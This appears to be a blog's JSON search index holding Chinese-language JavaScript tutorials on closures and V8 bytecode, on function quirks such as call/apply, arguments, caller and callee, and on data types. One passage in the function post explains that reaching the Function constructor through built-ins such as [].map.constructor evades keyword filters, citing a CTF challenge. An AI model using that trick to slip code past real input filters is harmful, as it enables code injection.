0x3e0ed5f6a9e3 @ 9 : 1e fb Star r0 95 S&gt; 0x3e0ed5f6a9e5 @ 11 : 4f fa 01 CallUndefinedReceiver0 r1, [1] 0x3e0ed5f6a9e8 @ 14 : 04 LdaUndefined 107 S&gt; 0x3e0ed5f6a9e9 @ 15 : 95 Return [generating bytecode for function: yoyoyo] Parameter count 1 Frame size 0 88 E&gt; 0x3e0ed5f6b022 @ 0 : 91 StackCheck 0x3e0ed5f6b023 @ 1 : 04 LdaUndefined 93 S&gt; 0x3e0ed5f6b024 @ 2 : 95 Return 你只要看關鍵字就好了，你有沒有看到建立 function 的那邊是什麼？是CreateClosure，我們只是很簡單的創建一個 function 並且呼叫他而已，V8 依然是用CreateClosure這個指令。 那如果今天是在 function 裡面建立一個新的 function 呢？ function yoyoyo()&#123; function inner()&#123;&#125; &#125; yoyoyo() 結果： [generating bytecode for function: yoyoyo] Parameter count 1 Frame size 8 0x2c9f0836b0fa @ 0 : 6e 00 00 02 CreateClosure [0], [0], #2 0x2c9f0836b0fe @ 4 : 1e fb Star r0 77 E&gt; 0x2c9f0836b100 @ 6 : 91 StackCheck 0x2c9f0836b101 @ 7 : 04 LdaUndefined 106 S&gt; 0x2c9f0836b102 @ 8 : 95 Return 一樣還是呼叫了CreateClosure。最後讓我們來試試看我們所熟知的那種，也就是要回傳建立的 function： function yoyoyo()&#123; function inner()&#123;&#125; return inner &#125; yoyoyo() 結果： [generating bytecode for function: yoyoyo] Parameter count 1 Frame size 8 0x3f4bde3eb0fa @ 0 : 6e 00 00 02 CreateClosure [0], [0], #2 0x3f4bde3eb0fe @ 4 : 1e fb Star r0 77 E&gt; 0x3f4bde3eb100 @ 6 : 91 StackCheck 116 S&gt; 0x3f4bde3eb101 @ 7 : 95 Return 差別在哪裡？只差在前者在回傳前多了一個LdaUndefined 載入 undefined，後者沒加所以把建立出來的 function 傳回去。可是在建立 function 的指令上面，是一模一樣的，都叫做CreateClosure。 只看 compile 出來的程式碼或許有失公允，如果能看到 V8 內部怎麼講就再好不過了。 以前曾經試圖想找但是 V8 太大了，這次我碰巧在找資料的時候看見這篇文章：Analyze implementation of closures in V8，雖然是九年前的文章，但裡面有稍微提到一些關鍵字，我循著關鍵字去找，找到了幾個很有趣的地方。 第一個是 src&#x2F;interpreter&#x2F;interpreter-generator.cc 這隻檔案，裡面記錄著所有 byte code 的指令，對CreateClosure它是這麼描述的： &#x2F;&#x2F; CreateClosure &lt;index&gt; &lt;slot&gt; &lt;tenured&gt; &#x2F;&#x2F; &#x2F;&#x2F; Creates a new closure for SharedFunctionInfo at position |index| in the &#x2F;&#x2F; constant pool and with the PretenureFlag &lt;tenured&gt;. 這檔案對以後看 byte code 很有幫助，所以要特地 po 在這邊記起來。 第二個是 src&#x2F;contexts.h，這邊紀錄的資訊十分豐富，你可以看到這一段註解： &#x2F;&#x2F; JSFunctions are pairs (context, function code), sometimes also called &#x2F;&#x2F; closures. A Context object is used to represent function contexts and &#x2F;&#x2F; dynamically pushed &#39;with&#39; contexts (or &#39;scopes&#39; in ECMA-262 speak). &#x2F;&#x2F; &#x2F;&#x2F; At runtime, the contexts build a stack in parallel to the execution &#x2F;&#x2F; stack, with the top-most context being the current context. All contexts &#x2F;&#x2F; have the following slots: &#x2F;&#x2F; &#x2F;&#x2F; [ scope_info ] This is the scope info describing the current context. It &#x2F;&#x2F; contains the names of statically allocated context slots, &#x2F;&#x2F; and stack-allocated locals. The names are needed for &#x2F;&#x2F; dynamic lookups in the presence of &#39;with&#39; or &#39;eval&#39;, and &#x2F;&#x2F; for the debugger. 除了我們最想知道的 Closure，它也提到了 context 跟 scope info，都是我們上面所討論的東西，概念類似只是名詞有點不太一樣而已。 但最重要的是這句： JSFunctions are pairs (context, function code), sometimes also called closures. 每一個 JS 的 function 都記錄著 context 的資訊，再次印證了我們先前所講的機制。 第三個也是最後一個，我意外地發現了 V8 裡面處理 scope 的地方，在 src&#x2F;ast&#x2F;scopes.cc，點連結之後連到的地方LookupRecursive就是在講述尋找變數的過程，先在 scope 裡面找，沒有的話再往上面找，還是找不到的話就在 global 宣告一個。 熟知這段過程這麼久，第一次看見 V8 的實現長怎樣，實在是很有趣。雖然 C++ 看不太懂，但幸好文章裡面有大量的註解，所以看著註解就可以理解五六成的程式碼。 結論有一個小地方要先說明，在我這篇以及上一篇裡面，我都刻意不提及eval跟with這兩個東西，因為這兩個東西會讓作用域變得複雜許多所以我才故意不帶到，在我看 V8 程式碼的時候也看到大量程式碼是在處理這兩個的操作，如果你對這兩個操作有興趣，可以自行去找相關的文章來看。 在上一次徹底理解 hoisting 的過程中我們有了最重要的底層機制的運行概念，也稍微看到了 V8 的 byte code，在這一次則是把上次的模型補充得更完整，只要按照那個模型去解釋程式的運行，什麼 hoisting 什麼 closure 的都能夠輕鬆理解。 這次也更深入了 V8，直接看到處理 scope 以及 context 相關的程式碼，但 V8 畢竟還是一個很大的專案，光幾個檔案我就看不完了，根本不能談上理解，因此只是以一種好玩的角度想去看一下而已。 這篇的目標跟上一篇一樣，對於本來就對這個主題不熟的人，希望能夠讓你們理解這個主題；對於已經熟悉的人也希望能帶來一些新的想法，畢竟我左看右看上看下看都沒看到什麼人直接跑去 V8 找相關的程式碼段落出來。 參考資料： 从static&#x2F;dynamic scope来谈JS的作用域 MDN 深入淺出瞭解 JavaScript 閉包（closure） 你不可不知的 JavaScript 二三事#Day5：湯姆克魯斯與唐家霸王槍——變數的作用域(Scope) (1) 關於 JS 作用域裡面的解釋 ECMA-262-3 in detail. Chapter 6. Closures. Grokking V8 closures for fun (and profit?) Understanding JavaScript Closures https://javascript.info/closure Analyze implementation of closures in V8","link":"/2018/12/08/javascript-closure/"},{"title":"覺得 JavaScript function 很有趣的我是不是很奇怪","text":"前言如果有先寫過其他 function 不是 first-class 的程式語言，在寫 JavaScript 的時候應該會經歷一些陣痛期，想說到底在做什麼——至少我是這樣的。 我當初發現可以把 function 當作參數到處傳遞的時候，對於比較複雜的 code 就要想很久，而 function 的其他行為也是讓我一頭霧水，例如說 function 居然也是 object，還有 this 到底是什麼鬼東西。 這一篇主要是想分享一些我覺得 function 比較有趣的地方。可是呢，直接開始講一大堆知識太無趣了，我希望能引起大家對這些知識的好奇程度，而想要引起好奇，最好的方法就是提供一個「你也會感興趣的問題」，你就會有動力繼續往下看了。 因此底下就以幾個小問題作為開場，雖然是問題的形式，但答不出來也完全沒有關係，如果你對這些問題的答案有興趣的話再往下看，沒興趣的話出口直走到底左轉。 話說這篇標題本來想取叫：「JavaScript function 知多少」或是「有趣的 JavaScript function」，但這種標題太無趣了，所以才想到這種輕小說式（？）的標題。 問題一：Named function expression一般來說在寫 function expression 的時候，都會這樣子寫： var fib = function(n) &#123; if (n &lt;= 1) return n return fib(n-1) + fib(n-2) &#125; console.log(fib(6)) 但其實後面的那個 function 也可以有名字，例如說： var fib = function calculateFib(n) &#123; if (n &lt;= 1) return n return fib(n-1) + fib(n-2) &#125; console.log(calculateFib) // ??? console.log(fib(6)) 問題來了： 那這個 function 到底叫做 fib 還是 calculateFib？ 底下那行 console.log(calculateFib) 會輸出什麼？ 既然前面都已經給它名字了，為什麼後面還要再多一個？ 問題二：apply 與 call大家都知道呼叫 function 基本上有三個方法： 直接呼叫 call apply 如底下範例所示： function add(a, b) &#123; console.log(a+b) &#125; add(1, 2) add.call(null, 1, 2) add.apply(null, [1, 2]) 問題來了： 為什麼除了一般的呼叫 function 以外，還需要 call 跟 apply？什麼情形下需要用到它們？ 問題三：建立函式要建立函式也有幾個方法，基本上就是： Function declaration Function expression Function constructor 如下所示： // Function declaration function a1(str) &#123; console.log(str) &#125; // Function expression var a2 = function(str) &#123; console.log(str) &#125; // 很少看到的 Function constructor var a3 = new Function('str', 'console.log(str)') a1('hi') a2('hello') a3('world') 大家可以發現在宣告函式的時候，一定都會有 function 這個關鍵字那有沒有辦法做到不用 function 關鍵字，也能建立函式呢？ 這時候可能有人立刻會想到：那不就是 arrow function！對，所以我要多加一個限制，不能使用 arrow function。還有人可能會想到：那 class 上的 method 或是 object 上的呢？例如說： var obj = &#123; hello() &#123; console.log(1) &#125; &#125; obj.hello() 這的確也是一種方法，但我說的不是 class 或是 object 的 method，而是一個跟物件無關的 function，就像：function add(a, b)&#123;&#125; 這一種的。 大家可以想一下是否還有其他方法。 問題四：黑魔法有一個 function 叫做 log，接收一個物件，然後印出物件的 str 這個屬性： function log(obj) &#123; console.log(obj.str) &#125; log(&#123;str: 'hello'&#125;) 現在在印出之前多呼叫一個函式，請你在那個函式裡面施展魔法，讓輸出從 hello 變成 world： function log(obj) &#123; doSomeMagic() console.log(obj.str) // 要讓這邊輸出的變成 world &#125; // 只能改動這個函式裡面的東西 function doSomeMagic() &#123; // 在這邊施展魔法 &#125; log(&#123;str: 'hello'&#125;) 只能改動 doSomeMagic 這個函式內部，加上一些程式碼，到底該怎麼做才能改動到另一個函式裡的東西呢？先提醒一下，覆寫 console.log 是一種解法，但很遺憾的不是這篇文章想討論的東西。 希望以上這四個問題有引起你的興趣，一二題是實作上真的會碰到的問題，三四題就是純屬好玩，基本上碰不太到。接著我們先不一一解答，而是直接來講一下 function 相關的知識，在講解到相關的段落時會順便一起回答問題。 Fun fun function（附註：這個標題其實是一個 YouTube 頻道，我自己沒什麼看過但我有些學生很推，所以也推薦給大家） 在 JavaScript 裡面，function 也是一個物件，或是用更專業的口吻來說，function 就是個 Callable Object，可以呼叫的物件，內部會實作 [[Call]] 這個 method。 既然是物件，你就可以用任何像物件的方式去操作它： function add(a, b) &#123; return a + b &#125; // 正常呼叫 console.log(add(1, 2)) // 當成一般物件 add.age = 18 console.log(add.age) // 18 // 當成陣列 add[0] = 10 add[1] = 20 add[2] = 30 add[3] = 40 add[4] = 50 for(let i=0; i&lt;5; i++) &#123; console.log(i, add[i]) &#125; 眼尖的朋友們可能會注意到，為什麼陣列那邊是 i&lt;5 而不是常見的 i&lt;add.length，這是因為 add 是個函式，所以 add.length 會是參數的總數也就是 2，而且這個屬性沒辦法被更改，所以才不行直接使用 add.length： function add(a, b) &#123; return a + b &#125; // 當成陣列 add[0] = 10 add[1] = 20 add[2] = 30 add[3] = 40 add[4] = 50 add.length = 100 console.log(add.length) // 2 直接把 function 拿來當一般物件跟陣列來使用，都是實作上不會發生而且應該盡量避免的情況，比較相似的只有「把 object 當作 array」來用，最知名的範例就是 function 裡面的 arguments 這個東西，它其實是一個「很像陣列的物件」，又稱做是偽陣列或是 array-like object。 function add(a, b) &#123; console.log(arguments) // [Arguments] &#123; '0': 1, '1': 2 &#125; console.log(arguments.length) // 2 // 像陣列一樣操作 for(let i=0; i&lt;arguments.length; i++) &#123; console.log(arguments[i]) &#125; // 可是不是陣列 console.log(Array.isArray(arguments)) // false console.log(arguments.map) // undefined &#125; add(1, 2) 那要怎麼樣讓這個偽裝成陣列的物件變成陣列呢？有幾種方法，例如說呼叫 Array.from： function add(a, b) &#123; let a1 = Array.from(arguments) console.log(Array.isArray(a1)) // true &#125; 還有，呼叫 Array.prototype.slice： function add(a, b) &#123; let a2 = Array.prototype.slice.call(arguments) console.log(Array.isArray(a2)) // true &#125; 這時就可以回答到前面提的問題了，明明 function 就可以直接呼叫，為什麼需要 apply 跟 call 這兩個方法？其中一個原因就是：this，大家可以發現在呼叫 slice 的時候，並不用把陣列傳進去，而是直接呼叫 [1,2,3].slice()，這背後跟 prototype 有關，因為 slice 這個方法其實是在 Array.prototype 上面： console.log([].slice === Array.prototype.slice) // true 比如說我們今天要幫 Array 新增一個方法叫做 first，可以返回第一個元素，就會這樣寫： // 提醒一下，幫不屬於自己的物件加上 prototype 不是一件好事 // 應該盡可能避免 Array.prototype.first = function() &#123; return this[0] &#125; console.log([1].first()) // 1 console.log([2,3,4].first()) // 2 可是大家可以發現，這個 first 的方法裡面只有短短一行：return this[0]，其實不只陣列，物件也可以用，那如果我想用在物件身上呢？我就只能直接去呼叫 Array.prototype.first 並且把 this 改掉，才能應用在我想要的物件身上。 所以這就是 apply 與 call 存在的原因之一，我需要去改 this 才能把這個函式應用在我想要的地方，這種情況就沒辦法像普通 function 一樣去呼叫，而 Array.prototype.slice.call(arguments) 就是這樣的道理。 你可能有看過這種 slice 的用法，但你有想過到底為什麼可以嗎？ 想知道原理，看一個東西準沒錯：ECMAScript Specification。 在 22.1.3.25 Array.prototype.slice 可以看到相關說明跟運行方式， 第一段是參數的說明，第二段是運行的步驟，第三段是其他額外說明。可以先看到最後面 Note3 的地方： The slice function is intentionally generic; it does not require that its this value be an Array object. Therefore it can be transferred to other kinds of objects for use as a method. 這邊就有寫了，這個 function 也可以用在物件身上，沒有一定要是 Array。而且從運行的步驟當中，可以看到是用 HasProperty 跟 Get 這兩個內部函式在處理的，而物件也是用這兩個，所以用在物件身上完全 ok。 而且一旦你知道了原理，還可以把前面提到的 function 也變成陣列： // 記得這邊參數一定要是三個，才能讓長度變成 3 function test(a,b,c) &#123;&#125; test[0] = 1 test[1] = 2 test[2] = 3 // function 搖身一變成為陣列 var arr = Array.prototype.slice.call(test) console.log(arr) // [1, 2, 3] 既然都提到了 call，那我們來提一下另外兩個我們需要 call 或者是 apply 的理由。第一個是當你想要傳入多個參數，但你只有陣列的時候。 這是什麼意思呢？例如說 Math.max 這個函式，其實是可以吃任意參數的，例如說： console.log(Math.max(1,2,3,4,5,6)) // 6 今天你有一個陣列，然後你想要求最大值，怎麼辦？你又不能直接呼叫 Math.max，因為你的參數是陣列而不是一個個的數字，直接呼叫的話你只會得到 NaN： var arr = [1,2,3,4] console.log(Math.max(arr)) // NaN 這時候就是 apply 派上用場的時刻了，第二個參數本來就是吃一個陣列，可以把陣列當作參數傳進去： var arr = [1,2,3,4] console.log(Math.max.apply(null, arr)) // 4 或是也可以運用 ES6 的展開運算子： var arr &#x3D; [1,2,3,4] console.log(Math.max(...arr)) &#x2F;&#x2F; 4 那你有沒有好奇過，為什麼 Math.max 可以吃無限多個參數？ 其實也沒為什麼，規格就是這樣寫的： 再來有關於第二個要使用 apply 或是 call 的理由，先給大家一個情境： 有一天小明想來寫一個函式判斷傳進來的參數是否是物件，而且不能是陣列也不能是函式，就是個普通的物件就好，聰明的他想到了一個方法叫做 toString，回憶起 toString 的幾個例子： var arr = [] var obj = &#123;&#125; var fn = function()&#123;&#125; console.log(arr.toString()) // 空字串 console.log(obj.toString()) // [object Object] console.log(fn.toString()) // function()&#123;&#125; 既然在物件身上用 toString 以後會變成 [object Object]，那就利用這樣來判斷就行了吧！於是小明寫下這段程式碼： function isObject(obj) &#123; if (!obj || !obj.toString) return false return obj.toString() === '[object Object]' &#125; var arr = [] var obj = &#123;&#125; var fn = function()&#123;&#125; console.log(isObject(arr)) // false console.log(isObject(obj)) // true console.log(isObject(fn)) // false 好，看起來十分合理，的確能夠判斷出是不是單純的物件，那到底有什麼問題呢？ 問題就出在 obj.toString() 這一行，太天真了，萬一 obj 自己覆寫了 toString 這個方法怎麼辦？ function isObject(obj) &#123; if (!obj || !obj.toString) return false return obj.toString() === '[object Object]' &#125; var obj = &#123; toString: function() &#123; return 'I am object QQ' &#125; &#125; console.log(isObject(obj)) // false 那要怎麼樣才能確保我呼叫的 toString 一定是我想呼叫的那一個？ 跟剛剛呼叫陣列的 slice 一樣，找到原始的 function 搭配使用 call 或是 apply： function isObject(obj) &#123; if (!obj || !obj.toString) return false // 新的 return Object.prototype.toString.call(obj) === '[object Object]' // 舊的 // return obj.toString() === '[object Object]' &#125; var obj = &#123; toString: function() &#123; return 'I am object QQ' &#125; &#125; console.log(isObject(obj)) // true 這樣就能確保我是真的呼叫到我要的那一個，而不是依賴於原本的物件，就可能會有被覆寫的風險。以上幾點就是 apply 與 call 存在的幾個原因，這都是用一般的 function call 沒有辦法達成的。 （附註：以上判斷物件的方法應該還是有一些 case 過不了，但我只是想示範 call 的存在理由之一，並不是真的想寫出 isObject 這個函式） 神秘的 function 自帶變數前面有提到 function 裡面會有一個自動被系統綁定的變數叫做 arguments，可以拿到傳進來的參數列表，雖然看起來像是陣列但其實是物件，而 arguments 其實有個神奇的特性，就是會自動跟參數做綁定，直接看下面範例就懂了： function test(a) &#123; console.log(a) // 1 console.log(arguments[0]) // 1 a = 2 console.log(a) // 2 console.log(arguments[0]) // 2 arguments[0] = 3 console.log(a) // 3 console.log(arguments[0]) // 3 &#125; test(1) 改了 a，arguments 裡的參數也會改變；改了 arguments，a 也會跟著改變。這個行為最貼近我們一般所講的 call by reference，就算是重新賦值也還是會跟原本的東西綁在一起。 我知道這個行為是因為這一篇文章：JS 原力覺醒 Day12- 傳值呼叫、傳址呼叫底下良葛格的回覆，才讓我發現原來 JS 的 arguments 還有這種特性。 講到這裡，還記得最前面的第四題嗎？ function log(obj) &#123; doSomeMagic() console.log(obj.str) // 要讓這邊輸出的變成 world &#125; // 只能改動這個函式裡面的東西 function doSomeMagic() &#123; // 在這邊施展魔法 &#125; log(&#123;str: 'hello'&#125;) 就是利用 arguments 的這個特性： function log(obj) &#123; doSomeMagic() console.log(obj.str) // 要讓這邊輸出的變成 world &#125; // 只能改動這個函式裡面的東西 function doSomeMagic() &#123; // magic! log.arguments[0].str = 'world' &#125; log(&#123;str: 'hello'&#125;) 可以從別的函式用 log.arguments 取得傳進去的參數，再利用 arguments 跟 formal parameter 會互相同步的特性，來改到看似不可能改到的 obj。 那如果把題目改一下呢？ (function(obj) &#123; doSomeMagic() console.log(obj.str) // 要讓這邊輸出的變成 world &#125;)(&#123;str: 'hello'&#125;) // 只能改動這個函式裡面的東西 function doSomeMagic() &#123; &#125; 沒有函式名稱了，那我們該怎麼拿到那個匿名函式的 arguments？ 除了 arguments 以外，還有一些參數是會自動幫你帶進來的，例如說最常見的 this，還有很不常見的幾個，其中一個叫做 caller，MDN 的解釋是這樣的： The function.caller property returns the function that invoked the specified function. It returns null for strict, async function and generator function callers. 可以用 caller 取得是哪一個 function 呼叫你的，例如說： function a()&#123; b() &#125; function b()&#123; console.log(b.caller) // [Function: a] &#125; a() 既然知道了這個特性，那前面匿名函式的問題就迎刃而解了： (function(obj) &#123; doSomeMagic() console.log(obj.str) // 要讓這邊輸出的變成 world &#125;)(&#123;str: 'hello'&#125;) // 只能改動這個函式裡面的東西 function doSomeMagic() &#123; doSomeMagic.caller.arguments[0].str = 'world' &#125; 如果你從來沒有看過 caller 這個參數，完全沒有關係，因為這本來就在開發上應該盡量避免用到，MDN 也把這個功能標示為 Deprecated，日後可能會被全面棄用，所以就跟我開頭講的一樣，這個題目純粹是 for fun，沒有什麼實際教學意義。 你以為結束了嗎？我原本也以為結束了，直到我在寫這篇文章的時候又想到還有一個延伸題，那就是如果連 doSomeMagic 都變成匿名函式呢？ (function() &#123; (function() &#123; // show your magic here // 只能改動這個函式 &#125;)() console.log(arguments[0].str) // 要讓這邊輸出的變成 world &#125;)(&#123;str: 'hello'&#125;) 這樣還能達成目標嗎？ 這邊先賣個關子，之後會一起解答。 建立函式前面寫了這麼多，最後才講回函式宣告，是因為我覺得這是相對上比較無聊的東西。如同我前面所說的，要建立函式的方法主要就三種： Function declaration Function expression Function constructor 先講第三種，因為在日常開發上幾乎不會用到，就是利用 function constructor 來建立函式： var f = new Function('str', 'console.log(str)') f(123) 當我們在使用 new 這個關鍵字的時候，就會去呼叫到 Function 的 constructor，如果不想用 new，我們其實也可以這樣子寫： var f = Function.constructor('str', 'console.log(str)') f(123) 或是你只留 Function 其實也可以： var f = Function('str', 'console.log(str)') f(123) 而這邊想強調的重點就在 constructor，先來看一個簡單的 JS 物件導向的範例： function Dog(name) &#123; this.name = name &#125; Dog.prototype.sayHi = function() &#123; console.log('I am', this.name) &#125; let d = new Dog('yo') d.sayHi() // I am yo 這邊 d 是 Dog 的 instance，所以有一個特性就是 d.constructor 就會是 Dog 這個被當作建構子來呼叫的函式： function Dog(name) &#123; this.name = name &#125; Dog.prototype.sayHi = function() &#123; console.log('I am', this.name) &#125; let d = new Dog('yo') d.sayHi() // I am yo console.log(d.constructor) // [Function: Dog] 知道這個特性可以做什麼呢？既然是這樣的話，那任意一個函式的 constructor，不就是 Function.constructor 了嗎？ function test() &#123;&#125; console.log(test.constructor) // [Function: Function] console.log(test.constructor === Function.constructor) // true 再搭配我們前面提到過的，可以利用 function constructor 來建立函式，就可以這樣使用： function test() &#123;&#125; var f = test.constructor('console.log(123)') f() // 123 這邊 test 可以是任意函式，代表說我們隨便找一個內建函式，一樣能達到相同效果： var f1 = [].map.constructor('console.log(123)') var f2 = Math.min.constructor('console.log(456)') f1() // 123 f2() // 456 如此一來，就可以達到：「不用 function 關鍵字也不用箭頭函式，但依然可以建立新的函式」，也就是開頭的問題三的解答。 這種用法通常會用在哪裡呢？用在繞過一些檢查！常見的做法是把 function 關鍵字濾掉、把 eval 濾掉、把箭頭函式濾掉等等來防止別人執行函式，這時就可以用 constructor 相關的東西來繞過，例如說這個：Google CTF 2018 Quals Web Challenge - gCalc 就用到了類似的技巧。 談完了 function constructor，就剩下 function declaration 跟 function expression 了，先來講這兩者的差別： // function declaration function a() &#123;&#125; // function expression var b = function() &#123;&#125; 這兩者最大的差別在於 a 的做法是真的宣告一個名為 a 的函式，而 b 其實是：「宣告一個匿名函式，並且指定給變數 b」，而且 b 是執行到那一行的時候才會做函式的初始化，而 a 是在進入這段程式碼的時候就初始化了，所以你就算在宣告 a 以前也可以執行 a： // function declaration a() function a() &#123; &#125; 可是 b 卻沒有辦法： // function expression b() // TypeError: b is not a function var b = function () &#123;&#125; 這行為跟 hoisting 有關，詳情可參考：我知道你懂 hoisting，可是你了解到多深？。 不過上面有一個地方其實有點講錯，我說了 b 是：「宣告一個匿名函式，並且指定給變數 b」，但其實後面宣告的這個函式並不是沒有名字的，你可以 throw 一個 error 就知道了： 這個函式其實還是叫做 b，否則的話 stacktrace 的紀錄就會寫 anonymous。這個看似好像很直觀，但其實背後有點學問在，這個命名是在我們把函式賦值給 b 時才作用的，可以參考 12.15.4 Runtime Semantics: Evaluation： 得到你要 assign 的名稱以後再去呼叫 NamedEvaluation 來幫函式命名，可參考 14.1.21 Runtime Semantics: NamedEvaluation： 除了讓 JS 引擎自動幫你命名以外，其實也可以自己命名，這我們就叫做 named function expression： // function expression var b = function helloB() &#123; throw 'I am b' &#125; b() 不要把它跟函式宣告搞混了，這依然不是 function declaration，只是有名稱的 function expression，一樣是執行到這一行的時候才會初始化函式，而且這個名稱 helloB 跟你想的不一樣，他是沒辦法在外面呼叫到的： // function expression var b = function helloB() &#123; throw 'I am b' &#125; helloB() // ReferenceError: helloB is not defined 對外來說，它只看得見 b 這個變數，看不到 helloB。 那這個函式名稱到底有什麼用？第一個用途是在 function 內部可以呼叫到： // function expression var b = function fib(n) &#123; if (n &lt;= 1) return n return fib(n-1) + fib(n-2) &#125; console.log(b(6)) // 8 第二個是 stacktrack 上面也會顯示這個名稱而不是 b： 在這個時候可能感受不到他的好處，讓我換個例子來講，應該會更清楚一點，例如說以下程式碼： var arr = [1,2,3,4,5] var str = arr.map(function(n)&#123; return n + 1&#125;) .filter(function(n)&#123; return n % 2 === 1&#125;) .join(',') console.log(str) // 3, 5 雖然大家現在都習慣寫箭頭函式了，但是在箭頭出現以前，基本上都是這樣寫的。大家以前可能只注意到我們傳了兩個 anonymous function 進去，但更精確一點地說，map 跟 filter 傳的參數其實就是兩個不同的 function expression。 這時候我們假設 filter 傳進去的函式出問題了： var arr = [1,2,3,4,5] var str = arr.map(function(n)&#123; return n + 1&#125;) .filter(function(n)&#123; throw 'errr' &#125;) .join(',') console.log(str) // 3, 5 那我們在 debug 的時候，會看到 stacktrace 哀傷地只顯示了 anonymous： 這時候若是改用 named function expression，就可以解決這個問題： 這就是使用 named function expression 的好處。 前面有提到另一個好處是在函式內部可以呼叫到，像是底下的範例： function run(fn, n) &#123; console.log(fn(n)) // 55 &#125; run(function fib(n) &#123; if (n &lt;= 1) return n return fib(n-1) + fib(n-2) &#125;, 10) run 只是一個空殼，會接收一個函式跟一個參數，接著就只是呼叫函式然後把執行結果印出來。在這邊我們傳入一個 named function expression 來算費氏數列，因為需要遞迴的關係，所以才幫函式取了名稱。 那如果傳進去的是一個 anonymous function 呢？也做得到遞迴嗎？ 還真的做得到。 function run(fn, n) &#123; console.log(fn(n)) // 55 &#125; run(function (n) &#123; if (n &lt;= 1) return n return arguments.callee(n-1) + arguments.callee(n-2) &#125;, 10) arguments 這個神奇的物件前面已經介紹過了，但沒有講到的是上面有一個屬性叫做 callee，MDN 的解釋是： callee is a property of the arguments object. It can be used to refer to the currently executing function inside the function body of that function. This is useful when the name of the function is unknown, such as within a function expression with no name (also called “anonymous functions”). 簡單來說就是可以取得自己，所以就算是匿名函式也可以做遞迴。 好，既然是這樣的話，大家還記得前面那個題目嗎？施展魔法的那個： (function() &#123; (function() &#123; // show your magic here // 只能改動這個函式 &#125;)() console.log(arguments[0].str) // 要讓這邊輸出的變成 world &#125;)(&#123;str: 'hello'&#125;) 解答就是這個十分噁心的組合： (function() &#123; (function() &#123; // show your magic here // 只能改動這個函式 arguments.callee.caller.arguments[0].str = 'world' &#125;)() console.log(arguments[0].str) // 要讓這邊輸出的變成 world &#125;)(&#123;str: 'hello'&#125;) 先利用 arguments.callee 取得自己，再加上 caller 取得呼叫自己的函式，然後再透過 arguments 改動參數。 解答時間先來解答一下最前面提的幾個問題： var fib = function calculateFib(n) &#123; if (n &lt;= 1) return n return fib(n-1) + fib(n-2) &#125; console.log(calculateFib) // ??? console.log(fib(6)) 1.那這個 function 到底叫做 fib 還是 calculateFib？叫做 calculateFib，但是在函式外面要用 fib 才能存取到，在函式內可以用 calculateFib。 2. 底下那行 console.log(calculateFib) 會輸出什麼？ReferenceError: calculateFib is not defined 3. 既然前面都已經給它名字了，為什麼後面還要再多一個？ 想呼叫自己的時候可以用這個名稱 stacktrace 會出現這個名字 4. 為什麼除了一般的呼叫 function 以外，還需要 call 跟 apply？什麼情形下需要用到它們？ 當我們想傳入陣列，但原本的函式只支援一個一個參數的時候 當我們想自訂 this 的時候 當我們想避開函式覆寫，直接呼叫某個函式的時候 5. 有沒有辦法做到不用 function 關鍵字，也能建立函式呢？利用 function constructor： var f1 = [].map.constructor('console.log(123)') var f2 = Math.min.constructor('console.log(456)') f1() // 123 f2() // 456 6. doSomeMagic 那題透過 arguments 的各種噁心組合搭配就可以了。 總結這篇整理了一些我對 JavaScript 函式的一些心得，有些我覺得很實用，有些就純粹是好玩，例如說 doSomeMagic 的那一題，就只是好玩而已，基本上改變 arguments 或是存取 caller 跟 callee 都是在實作上應該避免的行為，因為通常沒什麼理由這樣做，而且就算你真的想做什麼，也應該會有更好的做法。 至於實用的部分，named function expression 就滿實用的，YDKJS 的作者 Kyle Simpson 就提倡說：Always prefer named function expression，並且提出了一些好處，詳情可以參考：[day19] YDKJS (Scope) : Kyle Simpson 史上超級無敵討厭匿名函式（Anonymous function) 然後 call 跟 apply 則是蔡逼八時期的我曾經思考過的問題，想說既然都可以直接呼叫 function，為什麼要有這兩個？在一些程式碼裡面看到 Object.prototype.toString.call(obj) 的時候，也會想說那為什麼不直接 obj.toString() 就好？後來才知道原來是為了避開函式覆寫的問題，例如說陣列也是個物件，但是它的 toString 就有重新寫過，會做跟 join 差不多的事情。所以才需要直接去呼叫到 Object.prototype.toString，因為那才是我們想要的行為。 寫到這邊不禁想起一些前端的面試題，例如說考你 apply 與 call 的差異跟用法，我自己覺得與其考這個，不如考我在這篇文章裡面問的「為什麼要有 apply 與 call」，會比較有鑑別度，也能知道對方是不是真的理解這兩個函式。 總之呢，大概就是這樣了，如果有人有發現什麼 function 相關的好玩的特性，無論實不實用都可以分享給我，我很樂意知道！","link":"/2020/04/18/javascript-function-is-awesome/"},{"title":"來數數 JavaScript 的所有資料型別","text":"JavaScript 裡面一共有幾個資料型別？又分別是哪些？ 要談型別之前，我們應該要先知道 JavaScript 中一共有幾種型別，並且對每一種型別都有最基本的理解。在文章開始之前，你也可以自己先數數看，再來跟我對答案，看是不是正確的。 由於 JavaScript 是會進化的，這篇的型別會以本文寫作時最新的 ECMAScript 2021 為準，底下如果有提到「spec」，指的都是 ECMAScript 2021 language specification。 JavaScript 中一共有幾種型別？在 spec 當中，於第六章：「ECMAScript Data Types and Values」談到了型別，而且將其分為兩種型別： Types are further subclassified into ECMAScript language types and specification types. (p.71) 那什麼是 ECMAScript language types，什麼又是 specification types 呢？我們先來看後者： A specification type corresponds to meta-values that are used within algorithms to describe the semantics of ECMAScript language constructs and ECMAScript language types. The specification types include Reference, List, Completion, Property Descriptor, Environment Record, Abstract Closure, and Data Block. (p.100) Specification types 人如其名，是在規格中會用到的型別，可以拿來描述一些規格中的語法或是演算法，例如說你會在規格中看到「Reference」、「List」、「Environment Record」這些型別。 而另外一種 ECMAScript language types，規格上是這麼說的： An ECMAScript language type corresponds to values that are directly manipulated by an ECMAScript programmer using the ECMAScript language. (p.71) 因此，這才是我們一般在談的 JavaScript 中的型別，也是我們這篇要討論的主題。 那一共有幾種型別呢？根據規格所說： The ECMAScript language types are Undefined, Null, Boolean, String, Symbol, Number, BigInt, and Object. (p.71) 所以一共有 8 種型別，分別是： Undefined Null Boolean String Symbol Number BigInt Object 有些人可能會算成 7 種，少了最新的 BigInt，有些會算成 6 種，再少了 ES6 新增的 Symbol，但總之呢，答案是 8 種。 接著，我們就來簡單看一下規格上是怎麼描述這八種型別的，以及基本的使用方式。 1. Undefined規格上是這樣描述的： The Undefined type has exactly one value, called undefined. Any variable that has not been assigned a value has the value undefined. (p.72) 所以，Undefined 是一個型別，而 undefined 是一個 Undefined 型別的值，這就像是「 Number 是一個型別，而 9 就是 Number 型別的值」，是一樣的意思。 Undefined 這個型別就只有 undefined 這個值，當一個變數沒有被賦予任何值的時候，它的值就是 undefined。 這點很容易可以驗證： var 